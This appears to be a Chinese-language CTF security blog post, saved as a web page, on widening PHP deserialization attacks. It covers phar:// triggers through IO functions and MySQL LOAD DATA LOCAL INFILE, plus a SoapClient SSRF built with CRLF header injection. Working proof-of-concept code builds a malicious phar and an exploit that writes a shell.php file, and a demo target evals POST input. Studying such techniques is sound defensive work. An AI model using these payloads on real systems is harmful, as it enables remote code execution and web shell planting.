@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-hk">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,反序列化," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="phar提高篇之前我写过一篇关于phar拓宽反序列化攻击面的文章，根据seebug的研究员的总结，大概有这些函数可以触发反序列化漏洞但是根据De1ta-zsx的研究，发现并不局限于文件函数，这是一个所有的和IO有关的函数都有可能触发的问题。">
+<meta name="keywords" content="CTF,反序列化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反序列化攻击面拓展提高篇">
+<meta property="og:url" content="http://yoursite.com/2018/10/26/反序列化攻击面拓展提高篇/index.html">
+<meta property="og:site_name" content="C0mRaDe&#39;s Blog">
+<meta property="og:description" content="phar提高篇之前我写过一篇关于phar拓宽反序列化攻击面的文章，根据seebug的研究员的总结，大概有这些函数可以触发反序列化漏洞但是根据De1ta-zsx的研究，发现并不局限于文件函数，这是一个所有的和IO有关的函数都有可能触发的问题。">
+<meta property="og:locale" content="zh-hk">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1540430285365.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1540431223202.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1540431230761.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1540431235495.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1540438957427.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1540439032065.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1540540393770.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1540540506637.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1540540896236.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1540540881739.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1540541278952.png">
+<meta property="og:updated_time" content="2018-10-26T08:19:02.840Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="反序列化攻击面拓展提高篇">
+<meta name="twitter:description" content="phar提高篇之前我写过一篇关于phar拓宽反序列化攻击面的文章，根据seebug的研究员的总结，大概有这些函数可以触发反序列化漏洞但是根据De1ta-zsx的研究，发现并不局限于文件函数，这是一个所有的和IO有关的函数都有可能触发的问题。">
+<meta name="twitter:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1540430285365.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/10/26/反序列化攻击面拓展提高篇/"/>
+
+
+
+
+
+  <title>反序列化攻击面拓展提高篇 | C0mRaDe's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">C0mRaDe's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">大学生的酸腐和矫情是这世界上最没用的东西.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            歸檔
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/26/反序列化攻击面拓展提高篇/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="C0mRaDe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/gabe-crow.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C0mRaDe's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">反序列化攻击面拓展提高篇</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">發表於</span>
+              
+              <time title="創建於" itemprop="dateCreated datePublished" datetime="2018-10-26T16:13:24+08:00">
+                2018-10-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分類於</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/信息安全/" itemprop="url" rel="index">
+                    <span itemprop="name">信息安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="phar提高篇"><a href="#phar提高篇" class="headerlink" title="phar提高篇"></a>phar提高篇</h1><p>之前我写过一篇关于phar拓宽反序列化攻击面的<a href="https://coomrade.github.io/2018/09/11/phar-unser/#more" target="_blank" rel="noopener">文章</a>，根据seebug的研究员的总结，大概有这些函数可以触发反序列化漏洞<img src="https://www.github.com/coomrade/Img/raw/master/pics/1540430285365.png" alt="enter description here">但是根据<a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">De1ta-zsx</a>的研究，发现并不局限于文件函数，这是一个所有的和IO有关的函数都有可能触发的问题。<a id="more"></a></p>
+<h2 id="更多的可触发漏洞的函数"><a href="#更多的可触发漏洞的函数" class="headerlink" title="更多的可触发漏洞的函数"></a>更多的可触发漏洞的函数</h2><p>exif</p>
+<ul>
+<li><code>exif_thumbnail</code></li>
+<li><code>exif_imagetype</code></li>
+</ul>
+<p>gd</p>
+<ul>
+<li><code>imageloadfont</code></li>
+<li><code>imagecreatefrom***</code></li>
+</ul>
+<p>hash</p>
+<ul>
+<li><code>hash_hmac_file</code></li>
+<li><code>hash_file</code></li>
+<li><code>hash_update_file</code></li>
+<li><code>md5_file</code></li>
+<li><code>sha1_file</code></li>
+</ul>
+<p>file / url</p>
+<ul>
+<li><code>get_meta_tags</code></li>
+<li><code>get_headers</code></li>
+</ul>
+<p>standard</p>
+<ul>
+<li><code>getimagesize</code></li>
+<li><code>getimagesizefromstring</code></li>
+</ul>
+<p>zip<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$zip = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">$res = $zip-&gt;open(<span class="string">'c.zip'</span>);</span><br><span class="line">$zip-&gt;extractTo(<span class="string">'phar://test.phar/test'</span>);</span><br></pre></td></tr></table></figure></p>
+<p>如果<code>phar://</code>不能出现在头几个字符，可以在最前面加<code>compress.bzip2://</code>or<code>compress.zlib://</code><img src="https://www.github.com/coomrade/Img/raw/master/pics/1540431223202.png" alt="enter description here"><img src="https://www.github.com/coomrade/Img/raw/master/pics/1540431230761.png" alt="enter description here"><img src="https://www.github.com/coomrade/Img/raw/master/pics/1540431235495.png" alt="enter description here"></p>
+<h2 id="mysql文件操作触发"><a href="#mysql文件操作触发" class="headerlink" title="mysql文件操作触发"></a>mysql文件操作触发</h2><p><code>mysql</code>的<code>load data infile</code>语句从一个文本文件中以很高的速度读入一个表中，它同样可以触发反序列化漏洞，比如下面的代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123; </span><br><span class="line">    <span class="keyword">public</span> $s = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;s);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line">$m = mysqli_init();</span><br><span class="line">mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, <span class="keyword">true</span>);</span><br><span class="line">$s = mysqli_real_connect($m, <span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>, <span class="string">'mesboard'</span>, <span class="number">3306</span>);</span><br><span class="line">$p = mysqli_query($m, <span class="string">'LOAD DATA LOCAL INFILE \'phar://test.phar/aaa\' INTO TABLE users  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;'</span>);</span><br></pre></td></tr></table></figure></p>
+<p><code>makphar.php</code>:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $s=<span class="string">'ls'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">'test.phar'</span>);</span><br><span class="line">$phar=<span class="keyword">new</span> Phar(<span class="string">'test.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'a'</span>,<span class="string">'a'</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$o=<span class="keyword">new</span> A();</span><br><span class="line">$phar-&gt;setMetaData($o);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>还需要配置好<code>mysql.cnf</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">local-infile=1</span><br><span class="line">secure_file_priv=&apos;&apos;</span><br></pre></td></tr></table></figure></p>
+<p><code>php5.6</code>下：<img src="https://www.github.com/coomrade/Img/raw/master/pics/1540438957427.png" alt="enter description here"><code>php7.0</code>:<img src="https://www.github.com/coomrade/Img/raw/master/pics/1540439032065.png" alt="enter description here"><br>只需要目标表是存在的就可以了，并没有其他要求，唯一可惜的就是不是默认配置</p>
+<h1 id="利用原生类Soap"><a href="#利用原生类Soap" class="headerlink" title="利用原生类Soap"></a>利用原生类Soap</h1><p>利用php的原生类soap进行反序列化漏洞利用是前不久get到的一个新姿势。</p>
+<h2 id="什么是soap"><a href="#什么是soap" class="headerlink" title="什么是soap"></a>什么是soap</h2><p>SOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。<br>其采用HTTP作为底层通讯协议，XML作为数据传送的格式。</p>
+<h2 id="php的soapClient类"><a href="#php的soapClient类" class="headerlink" title="php的soapClient类"></a>php的soapClient类</h2><p>php中的<code>SoapClient</code>类可以创建soap数据报文，与wsdl接口进行交互。用法是这样的<img src="https://www.github.com/coomrade/Img/raw/master/pics/1540540393770.png" alt="enter description here">第一个参数是用来指明是否是wsdl模式，如果为<code>null</code>，那就是非wsdl模式，反序列化的时候会对第二个参数指明的url进行soap请求<img src="https://www.github.com/coomrade/Img/raw/master/pics/1540540506637.png" alt="enter description here">可以构造这个demo：<br><code>exp.php</code>:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://127.0.0.1/test.php'</span>;</span><br><span class="line">$post_string = <span class="string">'1=file_put_contents("shell.php", "&lt;?php phpinfo();?&gt;");'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: xxxx=1234'</span></span><br><span class="line">    );</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>.(string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string,<span class="string">'uri'</span>      =&gt; <span class="string">"aaab"</span>));</span><br><span class="line"></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">'%0d%0a'</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">'&amp;'</span>,<span class="string">'%26'</span>,$aaa);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$c=unserialize(urldecode($aaa));</span><br><span class="line">$c-&gt;ss();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><code>test.php</code>:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]==<span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'hi'</span>;</span><br><span class="line">	@$a=$_POST[<span class="number">1</span>];</span><br><span class="line">	@<span class="keyword">eval</span>($a);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这是一个模拟的可以造成SSRF的demo(改编自<a href="https://xz.aliyun.com/t/2148#toc-0" target="_blank" rel="noopener">wupco</a>)，执行一下，发现<code>shell.php</code>已经被成功写入内容。<img src="https://www.github.com/coomrade/Img/raw/master/pics/1540540896236.png" alt="enter description here"><img src="https://www.github.com/coomrade/Img/raw/master/pics/1540540881739.png" alt="enter description here">说一下原理，这个exp里面有几个点值得关注。</p>
+<ul>
+<li>当反序列化之后执行一个<code>SoapClient</code>没有的函数时，会调用<code>SoapClient</code>的<code>__call</code>函数，发出请求</li>
+<li><code>SoapClient</code>发出的请求包的<code>user_agent</code>是完全可控的，结合CRLF注入可以构造一个完全可控的POST请求，因为POST请求最关键的<code>Content-Length</code>和<code>Content-Type</code>都在<code>user_agent</code>之下</li>
+<li>只要目标进行了反序列化操作，这个exp可以进行SSRF</li>
+</ul>
+<p>如果是GET请求，就简单得多，只需要构造好location就可以了。POST请求的效果：<br><img src="https://www.github.com/coomrade/Img/raw/master/pics/1540541278952.png" alt="enter description here"></p>
+<h1 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h1><p><a href="https://xz.aliyun.com/t/2148#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/2148#toc-0</a><br><a href="https://xz.aliyun.com/t/2960" target="_blank" rel="noopener">https://xz.aliyun.com/t/2960</a><br><a href="https://www.anquanke.com/post/id/153065#h2-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/153065#h2-5</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/反序列化/" rel="tag"># 反序列化</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/07/MySQL报错注入/" rel="next" title="MySQL报错注入">
+                <i class="fa fa-chevron-left"></i> MySQL报错注入
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/10/26/文件包含的一些getshell姿势/" rel="prev" title="文件包含的一些getshell姿势">
+                文件包含的一些getshell姿势 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/gabe-crow.jpg"
+                alt="C0mRaDe" />
+            
+              <p class="site-author-name" itemprop="name">C0mRaDe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-name">文章</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分類</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">標籤</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#phar提高篇"><span class="nav-number">1.</span> <span class="nav-text">phar提高篇</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#更多的可触发漏洞的函数"><span class="nav-number">1.1.</span> <span class="nav-text">更多的可触发漏洞的函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql文件操作触发"><span class="nav-number">1.2.</span> <span class="nav-text">mysql文件操作触发</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用原生类Soap"><span class="nav-number">2.</span> <span class="nav-text">利用原生类Soap</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是soap"><span class="nav-number">2.1.</span> <span class="nav-text">什么是soap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php的soapClient类"><span class="nav-number">2.2.</span> <span class="nav-text">php的soapClient类</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Referer"><span class="nav-number">3.</span> <span class="nav-text">Referer</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">C0mRaDe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 強力驅動</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主題 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
